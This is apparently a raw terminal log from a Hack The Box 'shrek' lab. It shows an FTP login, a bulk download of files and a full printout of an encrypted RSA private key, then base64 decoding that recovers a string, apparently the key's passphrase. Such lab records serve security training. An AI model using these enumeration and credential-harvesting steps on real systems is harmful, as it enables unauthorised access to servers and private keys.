@@ -1,0 +1,420 @@
+┌─[root@parrot]─[~/hackthebox/shrek] 
+└──╼ #ftp 10.10.10.47                
+Connected to 10.10.10.47.            
+220 (vsFTPd 3.0.3)                   
+Name (10.10.10.47:root): donkey      
+331 Please specify the password.     
+Password:                            
+530 Login incorrect.                 
+Login failed.                        
+ftp> q                               
+?Ambiguous command                   
+ftp> exit                            
+221 Goodbye.                         
+┌─[root@parrot]─[~/hackthebox/shrek] 
+└──╼ #ftp 10.10.10.47                
+Connected to 10.10.10.47.            
+220 (vsFTPd 3.0.3)                   
+Name (10.10.10.47:root): donkey      
+331 Please specify the password.     
+Password:                            
+230 Login successful.                
+Remote system type is UNIX.          
+Using binary mode to transfer files. 
+ftp> ls                              
+200 PORT command successful. Consider using PASV.                          
+150 Here comes the directory listing.                                      
+-rw-r--r--    1 0        0            3072 Jan 02 02:35 1384900e7a1a4b609e54d882809b502f.txt                                                           
+-rw-r--r--    1 0        0            4096 Jan 02 02:35 16a666785c694b0396611e3e1f7ab984.txt                                                           
+-rw-r--r--    1 0        0           10240 Jan 02 02:35 25b27e6879f94cc8a6d7309c673868e6.txt                                                           
+-rw-r--r--    1 0        0            7168 Jan 02 02:35 28390baddcbd4051baf0c9cd778426f8.txt                                                           
+-rw-r--r--    1 0        0            3072 Jan 02 02:35 3497c00125834e6daf3beaaf52230fb8.txt                                                           
+-rw-r--r--    1 0        0            3072 Jan 02 02:35 3d6fa06b723e438589713677b6b58381.txt                                                           
+-rw-r--r--    1 0        0           11264 Jan 02 02:35 3e33b0363d6c4aeb91902707fe0b06e0.txt                                                           
+-rw-r--r--    1 0        0            8192 Jan 02 02:35 404bda081a134717a83a1194ba7e89d2.txt                                                           
+-rw-r--r--    1 0        0            4096 Jan 02 02:35 45f5eee25c594647a0d30bb54854bc56.txt                                                           
+-rw-r--r--    1 0        0           10240 Jan 02 02:35 46f9933c72ce40a4b118ca9618dbb8ef.txt                                                           
+-rw-r--r--    1 0        0            5120 Jan 02 02:35 48fee7eb169441d6922e697371f84d57.txt                                                           
+-rw-r--r--    1 0        0            3072 Jan 02 02:35 4f94a4b2cc7e41e2af082385f0296f0e.txt                                                           
+-rw-r--r--    1 0        0            5150 Jan 02 02:35 500fa162a0df41559750cd72dd3b5334.txt                                                           
+-rw-r--r--    1 0        0           11264 Jan 02 02:35 531a740e12c3418b9c1fc0a472c9178d.txt                                                           
+-rw-r--r--    1 0        0            6144 Jan 02 02:35 65c29a0eb01c490aa4bba8693dcd728e.txt                                                           
+-rw-r--r--    1 0        0            9216 Jan 02 02:35 774c2944806b424d8f3c0105d8167e85.txt                                                           
+-rw-r--r--    1 0        0            6144 Jan 02 02:35 78787b0bbe5945438536003acbb94d3e.txt                                                           
+-rw-r--r--    1 0        0           13312 Jan 02 02:35 a5ceeab4701f47b6ac5da995c52c9e98.txt                                                           
+-rw-r--r--    1 0        0            5550 Jan 02 02:35 abfc67376b5f4481b78464957428ea0b.txt                                                           
+-rw-r--r--    1 0        0           15360 Jan 02 02:35 bb6325c5172840b3ad67c4c4b5cc8df1.txt                                                           
+-rw-r--r--    1 0        0           10240 Jan 02 02:35 cca3d93e463e4ad78221da76eb853909.txt                                                           
+-rw-r--r--    1 0        0            3072 Jan 02 02:35 d2924d86241d4d9d856405892c3e6d3a.txt                                                           
+-rw-r--r--    1 0        0           15360 Jan 02 02:35 d910b42f6713454abba0d84868e9f271.txt                                                           
+-rw-r--r--    1 0        0           13312 Jan 02 02:35 ddf6e6f5c1e24dfa94170499242d44c3.txt                                                           
+-rw-r--r--    1 0        0           13312 Jan 02 02:35 e016856f23414b3790ab0a7d25a2e645.txt                                                           
+-rw-r--r--    1 0        0            7168 Jan 02 02:35 e04686a096544dfcbc2efaee79cea305.txt                                                           
+-rw-r--r--    1 0        0           15360 Jan 02 02:35 ecbbed9cda2c4a0586f8b4f80aaefbc8.txt                                                           
+-rw-r--r--    1 0        0            3072 Jan 02 02:35 ef62204df15e4a84ab54caf074d63dfe.txt                                                           
+-rw-r--r--    1 0        0            9216 Jan 02 02:35 f133d7bf0aad4b9ea45e5a96c6600088.txt                                                           
+-rw-r--r--    1 0        0            3072 Jan 02 02:35 fb4eaec5b4cd4651bf404cb769d44c0b.txt                                                           
+-rw-r--r--    1 0        0            5120 Jan 02 02:35 fc3917996d974055b0c95ad6800045bd.txt                                                           
+-rw-r--r--    1 0        0            1766 Aug 16  2017 key                
+226 Directory send OK.               
+ftp> mget *                          
+mget 1384900e7a1a4b609e54d882809b502f.txt? y                               
+200 PORT command successful. Consider using PASV.                          
+150 Opening BINARY mode data connection for 1384900e7a1a4b609e54d882809b502f.txt (3072 bytes).                                                         
+226 Transfer complete.               
+3072 bytes received in 0.00 secs (1.5275 MB/s)                             
+mget 16a666785c694b0396611e3e1f7ab984.txt? y                               
+200 PORT command successful. Consider using PASV.                          
+150 Opening BINARY mode data connection for 16a666785c694b0396611e3e1f7ab984.txt (4096 bytes).                                                         
+226 Transfer complete.               
+4096 bytes received in 0.00 secs (1.3493 MB/s)                             
+mget 25b27e6879f94cc8a6d7309c673868e6.txt? y                               
+200 PORT command successful. Consider using PASV.                          
+150 Opening BINARY mode data connection for 25b27e6879f94cc8a6d7309c673868e6.txt (10240 bytes).                                                        
+226 Transfer complete.               
+10240 bytes received in 0.00 secs (123.6155 MB/s)                          
+mget 28390baddcbd4051baf0c9cd778426f8.txt? y                               
+200 PORT command successful. Consider using PASV.                          
+150 Opening BINARY mode data connection for 28390baddcbd4051baf0c9cd778426f8.txt (7168 bytes).                                                         
+226 Transfer complete.               
+7168 bytes received in 0.01 secs (786.6053 kB/s)                           
+mget 3497c00125834e6daf3beaaf52230fb8.txt? y                               
+200 PORT command successful. Consider using PASV.                          
+150 Opening BINARY mode data connection for 3497c00125834e6daf3beaaf52230fb8.txt (3072 bytes).                                                         
+226 Transfer complete.               
+3072 bytes received in 0.00 secs (2.2161 MB/s)                             
+mget 3d6fa06b723e438589713677b6b58381.txt? y                               
+200 PORT command successful. Consider using PASV.                          
+150 Opening BINARY mode data connection for 3d6fa06b723e438589713677b6b58381.txt (3072 bytes).                                                         
+226 Transfer complete.               
+3072 bytes received in 0.00 secs (49.6557 MB/s)                            
+mget 3e33b0363d6c4aeb91902707fe0b06e0.txt? y                               
+200 PORT command successful. Consider using PASV.                          
+150 Opening BINARY mode data connection for 3e33b0363d6c4aeb91902707fe0b06e0.txt (11264 bytes).                                                        
+226 Transfer complete.               
+11264 bytes received in 0.00 secs (2.4935 MB/s)                            
+mget 404bda081a134717a83a1194ba7e89d2.txt? y                               
+200 PORT command successful. Consider using PASV.                          
+150 Opening BINARY mode data connection for 404bda081a134717a83a1194ba7e89d2.txt (8192 bytes).                                                         
+226 Transfer complete.               
+8192 bytes received in 0.00 secs (3.2111 MB/s)                             
+mget 45f5eee25c594647a0d30bb54854bc56.txt? y                               
+200 PORT command successful. Consider using PASV.                          
+150 Opening BINARY mode data connection for 45f5eee25c594647a0d30bb54854bc56.txt (4096 bytes).                                                         
+226 Transfer complete.               
+4096 bytes received in 0.00 secs (2.3921 MB/s)                             
+mget 46f9933c72ce40a4b118ca9618dbb8ef.txt? y                               
+200 PORT command successful. Consider using PASV.                          
+150 Opening BINARY mode data connection for 46f9933c72ce40a4b118ca9618dbb8ef.txt (10240 bytes).                                                        
+226 Transfer complete.               
+10240 bytes received in 0.01 secs (1.1787 MB/s)                            
+mget 48fee7eb169441d6922e697371f84d57.txt? y                               
+200 PORT command successful. Consider using PASV.                          
+150 Opening BINARY mode data connection for 48fee7eb169441d6922e697371f84d57.txt (5120 bytes).                                                         
+226 Transfer complete.               
+5120 bytes received in 0.00 secs (1.0035 MB/s)                             
+mget 4f94a4b2cc7e41e2af082385f0296f0e.txt? y                               
+200 PORT command successful. Consider using PASV.                          
+150 Opening BINARY mode data connection for 4f94a4b2cc7e41e2af082385f0296f0e.txt (3072 bytes).                                                         
+226 Transfer complete.               
+3072 bytes received in 0.00 secs (852.0306 kB/s)                           
+mget 500fa162a0df41559750cd72dd3b5334.txt? y                               
+200 PORT command successful. Consider using PASV.                          
+150 Opening BINARY mode data connection for 500fa162a0df41559750cd72dd3b5334.txt (5150 bytes).                                                         
+226 Transfer complete.               
+5150 bytes received in 0.00 secs (2.2833 MB/s)                             
+mget 531a740e12c3418b9c1fc0a472c9178d.txt? y                               
+200 PORT command successful. Consider using PASV.                          
+150 Opening BINARY mode data connection for 531a740e12c3418b9c1fc0a472c9178d.txt (11264 bytes).                                                        
+226 Transfer complete.               
+11264 bytes received in 0.01 secs (1.4315 MB/s)                            
+mget 65c29a0eb01c490aa4bba8693dcd728e.txt? y                               
+200 PORT command successful. Consider using PASV.                          
+150 Opening BINARY mode data connection for 65c29a0eb01c490aa4bba8693dcd728e.txt (6144 bytes).                                                         
+226 Transfer complete.               
+6144 bytes received in 0.00 secs (1.4853 MB/s)                             
+mget 774c2944806b424d8f3c0105d8167e85.txt? y                               
+200 PORT command successful. Consider using PASV.                          
+150 Opening BINARY mode data connection for 774c2944806b424d8f3c0105d8167e85.txt (9216 bytes).                                                         
+226 Transfer complete.               
+9216 bytes received in 0.00 secs (3.0937 MB/s)                             
+mget 78787b0bbe5945438536003acbb94d3e.txt? y                               
+200 PORT command successful. Consider using PASV.                          
+150 Opening BINARY mode data connection for 78787b0bbe5945438536003acbb94d3e.txt (6144 bytes).                                                         
+226 Transfer complete.               
+6144 bytes received in 0.00 secs (2.2279 MB/s)                             
+mget a5ceeab4701f47b6ac5da995c52c9e98.txt? y                               
+200 PORT command successful. Consider using PASV.                          
+150 Opening BINARY mode data connection for a5ceeab4701f47b6ac5da995c52c9e98.txt (13312 bytes).                                                        
+226 Transfer complete.               
+13312 bytes received in 0.01 secs (968.7034 kB/s)                          
+mget abfc67376b5f4481b78464957428ea0b.txt? y                               
+200 PORT command successful. Consider using PASV.                          
+150 Opening BINARY mode data connection for abfc67376b5f4481b78464957428ea0b.txt (5550 bytes).                                                         
+226 Transfer complete.               
+5550 bytes received in 0.00 secs (1.3285 MB/s)                             
+mget bb6325c5172840b3ad67c4c4b5cc8df1.txt? y                               
+200 PORT command successful. Consider using PASV.                          
+150 Opening BINARY mode data connection for bb6325c5172840b3ad67c4c4b5cc8df1.txt (15360 bytes).                                                        
+226 Transfer complete.               
+15360 bytes received in 0.32 secs (46.7425 kB/s)                           
+mget cca3d93e463e4ad78221da76eb853909.txt? y                               
+200 PORT command successful. Consider using PASV.                          
+150 Opening BINARY mode data connection for cca3d93e463e4ad78221da76eb853909.txt (10240 bytes).                                                        
+226 Transfer complete.               
+10240 bytes received in 0.00 secs (2.1482 MB/s)                            
+mget d2924d86241d4d9d856405892c3e6d3a.txt? y                               
+200 PORT command successful. Consider using PASV.                          
+150 Opening BINARY mode data connection for d2924d86241d4d9d856405892c3e6d3a.txt (3072 bytes).                                                         
+226 Transfer complete.               
+3072 bytes received in 0.00 secs (2.2588 MB/s)                             
+mget d910b42f6713454abba0d84868e9f271.txt? y                               
+200 PORT command successful. Consider using PASV.                          
+150 Opening BINARY mode data connection for d910b42f6713454abba0d84868e9f271.txt (15360 bytes).                                                        
+226 Transfer complete.               
+15360 bytes received in 0.30 secs (50.5134 kB/s)                           
+mget ddf6e6f5c1e24dfa94170499242d44c3.txt? y                               
+200 PORT command successful. Consider using PASV.                          
+150 Opening BINARY mode data connection for ddf6e6f5c1e24dfa94170499242d44c3.txt (13312 bytes).                                                        
+226 Transfer complete.               
+13312 bytes received in 0.00 secs (3.7795 MB/s)                            
+mget e016856f23414b3790ab0a7d25a2e645.txt? y                               
+200 PORT command successful. Consider using PASV.                          
+150 Opening BINARY mode data connection for e016856f23414b3790ab0a7d25a2e645.txt (13312 bytes).                                                        
+226 Transfer complete.               
+13312 bytes received in 0.00 secs (3.5862 MB/s)                            
+mget e04686a096544dfcbc2efaee79cea305.txt? y                               
+200 PORT command successful. Consider using PASV.                          
+150 Opening BINARY mode data connection for e04686a096544dfcbc2efaee79cea305.txt (7168 bytes).                                                         
+226 Transfer complete.               
+7168 bytes received in 0.00 secs (1.4274 MB/s)                             
+mget ecbbed9cda2c4a0586f8b4f80aaefbc8.txt? y                               
+200 PORT command successful. Consider using PASV.                          
+150 Opening BINARY mode data connection for ecbbed9cda2c4a0586f8b4f80aaefbc8.txt (15360 bytes).                                                        
+226 Transfer complete.               
+15360 bytes received in 0.27 secs (54.8625 kB/s)                           
+mget ef62204df15e4a84ab54caf074d63dfe.txt? y                               
+200 PORT command successful. Consider using PASV.                          
+150 Opening BINARY mode data connection for ef62204df15e4a84ab54caf074d63dfe.txt (3072 bytes).                                                         
+226 Transfer complete.               
+3072 bytes received in 0.00 secs (1.6124 MB/s)                             
+mget f133d7bf0aad4b9ea45e5a96c6600088.txt? y                               
+200 PORT command successful. Consider using PASV.                          
+150 Opening BINARY mode data connection for f133d7bf0aad4b9ea45e5a96c6600088.txt (9216 bytes).                                                         
+226 Transfer complete.               
+9216 bytes received in 0.00 secs (1.9389 MB/s)                             
+mget fb4eaec5b4cd4651bf404cb769d44c0b.txt? y                               
+200 PORT command successful. Consider using PASV.                          
+150 Opening BINARY mode data connection for fb4eaec5b4cd4651bf404cb769d44c0b.txt (3072 bytes).                                                         
+226 Transfer complete.               
+3072 bytes received in 0.00 secs (2.1653 MB/s)                             
+mget fc3917996d974055b0c95ad6800045bd.txt? y                               
+200 PORT command successful. Consider using PASV.                          
+150 Opening BINARY mode data connection for fc3917996d974055b0c95ad6800045bd.txt (5120 bytes).                                                         
+226 Transfer complete.               
+5120 bytes received in 0.00 secs (2.9919 MB/s)                             
+mget key? y                          
+200 PORT command successful. Consider using PASV.                          
+150 Opening BINARY mode data connection for key (1766 bytes).              
+226 Transfer complete.               
+1766 bytes received in 0.00 secs (1.4826 MB/s)                             
+ftp> exit                            
+221 Goodbye.                         
+┌─[root@parrot]─[~/hackthebox/shrek] 
+└──╼ #ls                             
+ 1384900e7a1a4b609e54d882809b502f.txt   531a740e12c3418b9c1fc0a472c9178d.txt   ecbbed9cda2c4a0586f8b4f80aaefbc8.txt                                    
+ 16a666785c694b0396611e3e1f7ab984.txt   65c29a0eb01c490aa4bba8693dcd728e.txt   ef62204df15e4a84ab54caf074d63dfe.txt                                    
+ 25b27e6879f94cc8a6d7309c673868e6.txt   774c2944806b424d8f3c0105d8167e85.txt   f133d7bf0aad4b9ea45e5a96c6600088.txt                                    
+ 28390baddcbd4051baf0c9cd778426f8.txt   78787b0bbe5945438536003acbb94d3e.txt   fb4eaec5b4cd4651bf404cb769d44c0b.txt                                    
+ 3497c00125834e6daf3beaaf52230fb8.txt   a5ceeab4701f47b6ac5da995c52c9e98.txt   fc3917996d974055b0c95ad6800045bd.txt                                    
+ 3d6fa06b723e438589713677b6b58381.txt   abfc67376b5f4481b78464957428ea0b.txt   ftp_credential                                                          
+ 3e33b0363d6c4aeb91902707fe0b06e0.txt   bb6325c5172840b3ad67c4c4b5cc8df1.txt   ftp_credential.png                                                      
+ 404bda081a134717a83a1194ba7e89d2.txt   cca3d93e463e4ad78221da76eb853909.txt   ftp_login.aup                                                           
+ 45f5eee25c594647a0d30bb54854bc56.txt   d2924d86241d4d9d856405892c3e6d3a.txt   ftp_login_data                                                          
+ 46f9933c72ce40a4b118ca9618dbb8ef.txt   d910b42f6713454abba0d84868e9f271.txt   key                                                                     
+ 48fee7eb169441d6922e697371f84d57.txt   ddf6e6f5c1e24dfa94170499242d44c3.txt   nmap                                                                    
+ 4f94a4b2cc7e41e2af082385f0296f0e.txt   e016856f23414b3790ab0a7d25a2e645.txt  'Smash Mouth - All Star.mp3'                                             
+ 500fa162a0df41559750cd72dd3b5334.txt   e04686a096544dfcbc2efaee79cea305.txt                                                                           
+┌─[root@parrot]─[~/hackthebox/shrek] 
+└──╼ #mkdir ftp                      
+┌─[root@parrot]─[~/hackthebox/shrek] 
+└──╼ #mv *.txt ftp/                  
+┌─[root@parrot]─[~/hackthebox/shrek] 
+└──╼ #ls                             
+ ftp   ftp_credential   ftp_credential.png   ftp_login.aup   ftp_login_data   key   nmap  'Smash Mouth - All Star.mp3'                                 
+┌─[root@parrot]─[~/hackthebox/shrek] 
+└──╼ #mv key ftp                     
+┌─[root@parrot]─[~/hackthebox/shrek] 
+└──╼ #ls                             
+ ftp   ftp_credential   ftp_credential.png   ftp_login.aup   ftp_login_data   nmap  'Smash Mouth - All Star.mp3'                                       
+┌─[root@parrot]─[~/hackthebox/shrek] 
+└──╼ #cd ftp                         
+┌─[root@parrot]─[~/hackthebox/shrek/ftp]                                   
+└──╼ #ls                             
+1384900e7a1a4b609e54d882809b502f.txt  45f5eee25c594647a0d30bb54854bc56.txt  78787b0bbe5945438536003acbb94d3e.txt  e016856f23414b3790ab0a7d25a2e645.txt 
+16a666785c694b0396611e3e1f7ab984.txt  46f9933c72ce40a4b118ca9618dbb8ef.txt  a5ceeab4701f47b6ac5da995c52c9e98.txt  e04686a096544dfcbc2efaee79cea305.txt 
+25b27e6879f94cc8a6d7309c673868e6.txt  48fee7eb169441d6922e697371f84d57.txt  abfc67376b5f4481b78464957428ea0b.txt  ecbbed9cda2c4a0586f8b4f80aaefbc8.txt 
+28390baddcbd4051baf0c9cd778426f8.txt  4f94a4b2cc7e41e2af082385f0296f0e.txt  bb6325c5172840b3ad67c4c4b5cc8df1.txt  ef62204df15e4a84ab54caf074d63dfe.txt 
+3497c00125834e6daf3beaaf52230fb8.txt  500fa162a0df41559750cd72dd3b5334.txt  cca3d93e463e4ad78221da76eb853909.txt  f133d7bf0aad4b9ea45e5a96c6600088.txt 
+3d6fa06b723e438589713677b6b58381.txt  531a740e12c3418b9c1fc0a472c9178d.txt  d2924d86241d4d9d856405892c3e6d3a.txt  fb4eaec5b4cd4651bf404cb769d44c0b.txt 
+3e33b0363d6c4aeb91902707fe0b06e0.txt  65c29a0eb01c490aa4bba8693dcd728e.txt  d910b42f6713454abba0d84868e9f271.txt  fc3917996d974055b0c95ad6800045bd.txt 
+404bda081a134717a83a1194ba7e89d2.txt  774c2944806b424d8f3c0105d8167e85.txt  ddf6e6f5c1e24dfa94170499242d44c3.txt  key                                  
+┌─[root@parrot]─[~/hackthebox/shrek/ftp]                                   
+└──╼ #cat key                        
+-----BEGIN RSA PRIVATE KEY-----      
+Proc-Type: 4,ENCRYPTED               
+DEK-Info: AES-128-CBC,94DC7309349E17F8ED6776ED69D6265A                     
+
+rx7VJS6fzctpfTQ16y9M2CYG701eIh3nDQND+MSFAMSD8JiElqiIH7yA6TpXKPPx           
+A9gcxf1qlezc3XIhQpsLN9tLJpOxWYMniUo06/7k+2vWO6AzX27hVPRk1vk9OTWG           
+gRe856uaS8WfQ3XxehHNk1bu710HzBSwZn/XNbHsNo74Bpol8MTm2BTjvnuxnFY8           
+tvw53nbXMQffBmrwBTvc5aaCk/C0LfvemSxLAgAwMACNpbPmdw9NkUxRDbL/93Q1           
+ZYMlFxiXhLgFWQFdW/u2WURmOcIuAHd1V8gWIvY10IpH7o4nXaCI4D8PUmnIDt2N           
+k6Q3Znnfe8BrzFlD1NdG5SfHNdNUn5N9DROk0cZsL+D9e9bQb5CoyL2ioL9fEeRv           
+4J5w2ZnIHStAez+Za11WGcZsW3jk2eXGPZiD99k5GcazWQ60dv5dUR6J5fkxaibi           
+unqmN2tDaKReT7aT4Im6pLUscN8t2w8dprgsD/EbMsPr0X/TqOShXXhMUhk/9SAY           
+2Rvudp97fqYHugIch4lZdDpYS//KRwzO+wQOQARX0tJ0DJ++lY6WNM/BD6+HUk+v           
+2c3ziM7DL4i7zhA0qnc8796Nxs8D/QTUWjmcNQhcOM4rAYsmyRqyoVe3ciadKWmk           
+vfwBJYxCwE9I9qUfZS3TsEYdbLE4MjlFB+Zn+fYpyA950hVFDxvu+E8zIcSYA0bJ           
+GAra2vH/xgmEoptYqeav/sstisJOYPW1Ui3K5C9E0QMH2MRReZoHlToCSNwUOWRo           
+rY1z3UZMyV5qw3VsuOk+n81P2npyP0RYo6xjAQW/1uN01LPi6y79j/3k9L35N7pH           
+vJHACTHa1bgCGkYGYm75DRIPYqJKs8g3htPHTbyfAfybeMBFQFxz3SBSWp8T9yjF           
++WKUWQ2EmUtgC9n04tLf1/SIldvtOvtwyv2LiIzgvtT6DCMoulprRlb+U0iY1kbQ           
+lrpUhFtcK1SvC4Z6ebAEoX/jVRWKdbKldr35ECwIiMVNUFhvXwg4JRdmgmeeDga5           
+66TSTqupISE7q6MuBfesQItkoiairO36enBvYdifN4/kRFBNXo1ZUTzdKVw6/UVo           
+n9tG9Fnk/z/Ee0iuT3PS0xtu6cBaXzFggm1n73honBjJzIJdtDAJ2AFSMJg6F6TJ           
+d0BPB0SGfF8rU+s0RjBhr1nE+px9qYKsuPAKkfi/b/EVa5WEacNezUTTKW9v9DjM           
+ym/zSi9GMDEczlFO2wthN5MXh0XNzUyQxDAcek1uZyaQd66NXQ0AywQG114+XLx8           
+29sJvTuy6PXJs4ZUCno4/7RQnG9mwHtcV2f3ETASTjtsxBVotzfnpB22jgRND1fi           
+Ovqy0xbhRUrBhl8MjuE4Ha/ttoKvbDxC6PlVPMfjp3y2sTIDRp7HpAJfKoVMdJ5Y           
+9FoWkWhrGkshGMIxyF3YE6cyhy8OOvmoEcNjyusCi1VWJpRxWU9Ml+GUH5gsjdAV           
+yiPvEG4LnM4gGeHhn9CZcrFJSYKIS0s+410YQvpECx09LaLBtq5y0QNkIspuKSPB           
+UDidMCyboqlc47D6SgNk7WQqut9tFj6PXE3chFFBHGfZ3hF9HnbUWBEiqyvOlAnm           
+-----END RSA PRIVATE KEY-----        
+┌─[root@parrot]─[~/hackthebox/shrek/ftp]                                   
+└──╼ #                               
+┌─[root@parrot]─[~/hackthebox/shrek/ftp]                                   
+└──╼ #for i in $(ls *.txt);do base64 -d $i > $i.b64 ;done                  
+base64: invalid input                
+base64: invalid input                
+┌─[root@parrot]─[~/hackthebox/shrek/ftp]                                   
+└──╼ #ls                             
+1384900e7a1a4b609e54d882809b502f.txt      48fee7eb169441d6922e697371f84d57.txt.b64  d2924d86241d4d9d856405892c3e6d3a.txt                               
+1384900e7a1a4b609e54d882809b502f.txt.b64  4f94a4b2cc7e41e2af082385f0296f0e.txt      d2924d86241d4d9d856405892c3e6d3a.txt.b64                           
+16a666785c694b0396611e3e1f7ab984.txt      4f94a4b2cc7e41e2af082385f0296f0e.txt.b64  d910b42f6713454abba0d84868e9f271.txt                               
+16a666785c694b0396611e3e1f7ab984.txt.b64  500fa162a0df41559750cd72dd3b5334.txt      d910b42f6713454abba0d84868e9f271.txt.b64                           
+25b27e6879f94cc8a6d7309c673868e6.txt      500fa162a0df41559750cd72dd3b5334.txt.b64  ddf6e6f5c1e24dfa94170499242d44c3.txt                               
+25b27e6879f94cc8a6d7309c673868e6.txt.b64  531a740e12c3418b9c1fc0a472c9178d.txt      ddf6e6f5c1e24dfa94170499242d44c3.txt.b64                           
+28390baddcbd4051baf0c9cd778426f8.txt      531a740e12c3418b9c1fc0a472c9178d.txt.b64  e016856f23414b3790ab0a7d25a2e645.txt                               
+28390baddcbd4051baf0c9cd778426f8.txt.b64  65c29a0eb01c490aa4bba8693dcd728e.txt      e016856f23414b3790ab0a7d25a2e645.txt.b64                           
+3497c00125834e6daf3beaaf52230fb8.txt      65c29a0eb01c490aa4bba8693dcd728e.txt.b64  e04686a096544dfcbc2efaee79cea305.txt                               
+3497c00125834e6daf3beaaf52230fb8.txt.b64  774c2944806b424d8f3c0105d8167e85.txt      e04686a096544dfcbc2efaee79cea305.txt.b64                           
+3d6fa06b723e438589713677b6b58381.txt      774c2944806b424d8f3c0105d8167e85.txt.b64  ecbbed9cda2c4a0586f8b4f80aaefbc8.txt                               
+3d6fa06b723e438589713677b6b58381.txt.b64  78787b0bbe5945438536003acbb94d3e.txt      ecbbed9cda2c4a0586f8b4f80aaefbc8.txt.b64                           
+3e33b0363d6c4aeb91902707fe0b06e0.txt      78787b0bbe5945438536003acbb94d3e.txt.b64  ef62204df15e4a84ab54caf074d63dfe.txt                               
+3e33b0363d6c4aeb91902707fe0b06e0.txt.b64  a5ceeab4701f47b6ac5da995c52c9e98.txt      ef62204df15e4a84ab54caf074d63dfe.txt.b64                           
+404bda081a134717a83a1194ba7e89d2.txt      a5ceeab4701f47b6ac5da995c52c9e98.txt.b64  f133d7bf0aad4b9ea45e5a96c6600088.txt                               
+404bda081a134717a83a1194ba7e89d2.txt.b64  abfc67376b5f4481b78464957428ea0b.txt      f133d7bf0aad4b9ea45e5a96c6600088.txt.b64                           
+45f5eee25c594647a0d30bb54854bc56.txt      abfc67376b5f4481b78464957428ea0b.txt.b64  fb4eaec5b4cd4651bf404cb769d44c0b.txt                               
+45f5eee25c594647a0d30bb54854bc56.txt.b64  bb6325c5172840b3ad67c4c4b5cc8df1.txt      fb4eaec5b4cd4651bf404cb769d44c0b.txt.b64                           
+46f9933c72ce40a4b118ca9618dbb8ef.txt      bb6325c5172840b3ad67c4c4b5cc8df1.txt.b64  fc3917996d974055b0c95ad6800045bd.txt                               
+46f9933c72ce40a4b118ca9618dbb8ef.txt.b64  cca3d93e463e4ad78221da76eb853909.txt      fc3917996d974055b0c95ad6800045bd.txt.b64                           
+48fee7eb169441d6922e697371f84d57.txt      cca3d93e463e4ad78221da76eb853909.txt.b64  key                                                                
+┌─[root@parrot]─[~/hackthebox/shrek/ftp]                                   
+└──╼ #for i in $(ls *.txt);do echo $i; base64 -d $i > $i.b64 ;done                                                                                     
+1384900e7a1a4b609e54d882809b502f.txt 
+16a666785c694b0396611e3e1f7ab984.txt 
+25b27e6879f94cc8a6d7309c673868e6.txt 
+28390baddcbd4051baf0c9cd778426f8.txt 
+3497c00125834e6daf3beaaf52230fb8.txt 
+3d6fa06b723e438589713677b6b58381.txt 
+3e33b0363d6c4aeb91902707fe0b06e0.txt 
+404bda081a134717a83a1194ba7e89d2.txt 
+45f5eee25c594647a0d30bb54854bc56.txt 
+46f9933c72ce40a4b118ca9618dbb8ef.txt 
+48fee7eb169441d6922e697371f84d57.txt 
+4f94a4b2cc7e41e2af082385f0296f0e.txt 
+500fa162a0df41559750cd72dd3b5334.txt 
+base64: invalid input                
+531a740e12c3418b9c1fc0a472c9178d.txt 
+65c29a0eb01c490aa4bba8693dcd728e.txt 
+774c2944806b424d8f3c0105d8167e85.txt 
+78787b0bbe5945438536003acbb94d3e.txt 
+a5ceeab4701f47b6ac5da995c52c9e98.txt 
+abfc67376b5f4481b78464957428ea0b.txt 
+base64: invalid input                
+bb6325c5172840b3ad67c4c4b5cc8df1.txt 
+cca3d93e463e4ad78221da76eb853909.txt 
+d2924d86241d4d9d856405892c3e6d3a.txt 
+d910b42f6713454abba0d84868e9f271.txt 
+ddf6e6f5c1e24dfa94170499242d44c3.txt 
+e016856f23414b3790ab0a7d25a2e645.txt 
+e04686a096544dfcbc2efaee79cea305.txt 
+ecbbed9cda2c4a0586f8b4f80aaefbc8.txt 
+ef62204df15e4a84ab54caf074d63dfe.txt 
+f133d7bf0aad4b9ea45e5a96c6600088.txt 
+fb4eaec5b4cd4651bf404cb769d44c0b.txt 
+fc3917996d974055b0c95ad6800045bd.txt 
+┌─[root@parrot]─[~/hackthebox/shrek/ftp]                                   
+└──╼ #less 500fa162a0df41559750cd72dd3b5334.txt                            
+┌─[root@parrot]─[~/hackthebox/shrek/ftp]                                   
+└──╼ #echo -n UHJpbmNlQ2hhcm1pbmc= | base64 -d                             
+PrinceCharming┌─[root@parrot]─[~/hackthebox/shrek/ftp]                     
+└──╼ #less abfc67376b5f4481b78464957428ea0b.txt                            
+┌─[root@parrot]─[~/hackthebox/shrek/ftp]                                   
+└──╼ #echo -n J1x4MDFceGQzXHhlMVx4ZjJceDE3VCBceGQwXHg4YVx4ZDZceGUyXHhiZFx4OWVceDllflAoXHhmN1x4ZTlceGE1XHhjMUtUXHg5YUlceGRkXFwhXHg5NXRceGUxXHhkNnBceGFhInUyXHhjMlx4ODVGXHgxZVx4YmNceDAwXHhiOVx4MTdceDk3XHhiOFx4MGJceGM1eVx4ZWM8Sy1ncDlceGEwXHhjYlx4YWNceDlldFx4ODl6XHgxM1x4MTVceDk0RG5ceGViXHg5NVx4MTlbXHg4MFx4ZjFceGE4LFx4ODJHYFx4ZWVceGU4Q1x4YzFceDE1XHhhMX5UXHgwN1x4Y2N7XHhiZFx4ZGFceGYwXHg5ZVx4MWJoXCdRVVx4ZTdceDE2M1x4ZDRGXHhjY1x4YzVceDk5dyc= | base64 -d       
+'\x01\xd3\xe1\xf2\x17T \xd0\x8a\xd6\xe2\xbd\x9e\x9e~P(\xf7\xe9\xa5\xc1KT\x9aI\xdd\\!\x95t\xe1\xd6p\xaa"u2\xc2\x85F\x1e\xbc\x00\xb9\x17\x97\xb8\x0b\xc5y\xec<K-gp9\xa0\xcb\xac\x9et\x89z\x13\x15\x94Dn\xeb\x95\x19[\x80\xf1\xa8,\x82G`\xee\xe8C\xc1\x15\xa1~T\x07\xcc{\xbd\xda\xf0\x9e\x1bh\'QU\xe7\x163\xd4F\xcc\xc5\x99w'┌─[root@parrot]─[~/hackthebox/shrek/ftp]                       
+└──╼ #echo -n UHJpbmNlQ2hhcm1pbmc= | base64 -d > strings                                                                                               
+┌─[root@parrot]─[~/hackthebox/shrek/ftp]                                   
